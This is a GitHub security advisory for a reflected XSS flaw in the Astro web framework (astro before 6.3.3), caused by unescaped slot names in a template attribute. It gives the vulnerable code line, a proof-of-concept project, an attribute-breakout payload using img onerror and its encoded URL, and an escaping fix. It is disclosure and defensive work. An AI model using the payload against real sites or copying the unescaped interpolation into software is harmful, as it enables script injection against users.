# [H] Astro: Reflected XSS via unescaped slot name

## Summary
Severity: High
Advisory: GHSA-8hv8-536x-4wqp
CVE: CVE-2026-50146
CWE: CWE-79, CWE-80
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-06-16
Source: https://github.com/advisories/GHSA-8hv8-536x-4wqp
Type: github-advisory

## Affected
- npm: `astro` — affected >=0 <6.3.3

## Details
## Summary

When a component uses a `client:*` directive, Astro inserts named slot content into a `data-astro-template` attribute without HTML escaping the slot name allowing an attacker to break out of the attribute context and inject arbitrary HTML, resulting in reflected XSS during SSR.

This is similar to GHSA-wrwg-2hg8-v723 but exploits a different injection point.

## Vulnerable Code

`packages/astro/src/runtime/server/render/component.ts:371:376`

```ts
// component.ts:371
`<template data-astro-template${key !== 'default' ? `="${key}"` : ''}>${children[key]}</template>`
```

I found that key is interpolated directly into the attribute value without proper escaping.

## Proof of Concept

For the PoC, I set up with a minimal repository with Astro 6.3.1, Node.js: v26.0.0.

**`astro.config.mjs`**
```js
import react from '@astrojs/react';
import node from '@astrojs/node';
import { defineConfig } from 'astro/config';
export default defineConfig({
  output: 'server',
  adapter: node({ mode: 'standalone' }),
  integrations: [react()],
});
```

**`src/pages/index.astro`**
```astro
---
import Wrapper from '../components/Wrapper.jsx';
const slotName = Astro.url.searchParams.get('tab') ?? 'default';
---
<html><body>
  <Wrapper client:load>
    <div slot={slotName}>content</div>
  </Wrapper>
</body></html>
```

**`src/components/Wrapper.jsx`**
```jsx
export default function Wrapper() { return null; }
```

**Payload:**
```
abc"></template></astro-island><img src=x onerror=confirm(document.domain)><!--
```
Accessing this URL will trigger the popup.

http://localhost:4321/?tab=abc%22%3E%3C%2Ftemplate%3E%3C%2Fastro-island%3E%3Cimg+src%3Dx+onerror%3Dconfirm(document.domain)%3E%3C!--



<img width="1268" height="592" alt="image" src="https://github.com/user-attachments/assets/675cdc04-4134-4d83-883c-abe16d751ec7" />



This will render in html.

```html
<template data-astro-template="abc"></template></astro-island>
<img src=x onerror=confirm(document.domain)><!--">content</template>
```

## Fix

I suggest leveraging the existing escape function on the slot name.

```ts
// component.ts:371
`<template data-astro-template${key !== 'default' ? `="${escapeHTML(String(key))}"` : ''}>${children[key]}</template>`
```

---

## References
- https://github.com/withastro/astro/security/advisories/GHSA-8hv8-536x-4wqp
- https://nvd.nist.gov/vuln/detail/CVE-2026-50146
- https://github.com/withastro/astro
